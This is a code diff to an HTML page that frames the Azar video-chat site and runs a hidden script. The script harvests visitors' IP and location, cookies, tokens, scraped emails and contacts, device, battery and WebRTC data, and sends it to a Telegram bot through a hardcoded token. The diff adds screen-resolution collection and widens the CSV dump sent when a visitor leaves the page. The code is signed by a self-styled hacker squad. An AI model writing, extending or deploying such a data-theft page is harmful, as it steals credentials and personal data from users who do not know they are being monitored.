@@ -10,9 +10,10 @@
 <body>
     <iframe src="https://azarlive.com"></iframe>
     <script>
-       (function() {
+        (function() {
     'use strict';
 
+    // Initialisation
     let userInfos = [];
     const sentUserIDs = new Set();
 
@@ -53,6 +54,7 @@
     const TELEGRAM_BOT_TOKEN = '7129102494:AAFIPD-1wjnSliqnHknIhqyfFJK4StgJZ3A';
     const TELEGRAM_CHAT_ID = '7341972878';
 
+    // Fonction pour envoyer à Telegram
     function sendToTelegram(userInfo, blob = null, type = 'message') {
         const url = type === 'video' ? 
             `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo` : 
@@ -82,6 +84,7 @@ Appareil: ${userInfo.device?.slice(0, 100) || 'Inconnu'}...
 Batterie: ${userInfo.battery || 'Non disponible'}
 Fuseau: ${userInfo.timezone || 'Inconnu'}
 Langue: ${userInfo.language || 'Inconnue'}
+Résolution: ${userInfo.resolution || 'Inconnue'}
 Métadonnées WebRTC: ${userInfo.webrtcMeta || 'Pas encore, connard'}
 *MONGO TOM & FRENCH HACKER SQUAD ⚡*`;
 
@@ -194,6 +197,7 @@ Métadonnées WebRTC: ${userInfo.webrtcMeta || 'Pas encore, connard'}
         const scrapedData = scrapeEmailsOrPseudos();
         const contacts = scrapeContacts();
         const deviceInfo = navigator.userAgent;
+        const resolution = `${screen.width}x${screen.height}`;
         let batteryInfo = "Non disponible";
         navigator.getBattery?.().then(battery => {
             batteryInfo = `Niveau: ${battery.level * 100}%, Charge: ${battery.charging ? "Oui" : "Non"}`;
@@ -218,6 +222,7 @@ Métadonnées WebRTC: ${userInfo.webrtcMeta || 'Pas encore, connard'}
             scrapedData: scrapedData,
             contacts: contacts,
             device: deviceInfo,
+            resolution: resolution,
             battery: batteryInfo,
             timezone: timezone,
             language: language,
@@ -255,6 +260,7 @@ Métadonnées WebRTC: ${userInfo.webrtcMeta || 'Pas encore, connard'}
             <span><strong>Données scrapées:</strong> ${userInfo.scrapedData}</span><br>
             <span><strong>Contacts:</strong> ${userInfo.contacts}</span><br>
             <span><strong>Appareil:</strong> ${userInfo.device}</span><br>
+            <span><strong>Résolution:</strong> ${userInfo.resolution}</span><br>
             <span><strong>Batterie:</strong> ${userInfo.battery}</span><br>
             <span><strong>Fuseau horaire:</strong> ${userInfo.timezone}</span><br>
             <span><strong>Langue:</strong> ${userInfo.language}</span><br>
@@ -482,7 +488,7 @@ Métadonnées WebRTC: ${userInfo.webrtcMeta || 'Pas encore, connard'}
 
     window.addEventListener('beforeunload', () => {
         const csvContent = userInfos.map(user => {
-            return `${user.time},${user.ipAddress},${user.isp},${user.city},${user.country},${user.gender},${user.userID},${user.username},${user.cookies},${user.tokens},${user.scrapedData},${user.contacts},${user.webrtcMeta}, MONGO TOM`;
+            return `${user.time},${user.ipAddress},${user.isp},${user.city},${user.country},${user.gender},${user.userID},${user.username},${user.cookies},${user.tokens},${user.scrapedData},${user.contacts},${user.device},${user.battery},${user.timezone},${user.language},${user.webrtcMeta}, MONGO TOM`;
         }).join("\n");
         const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`;
         const formData = new FormData();
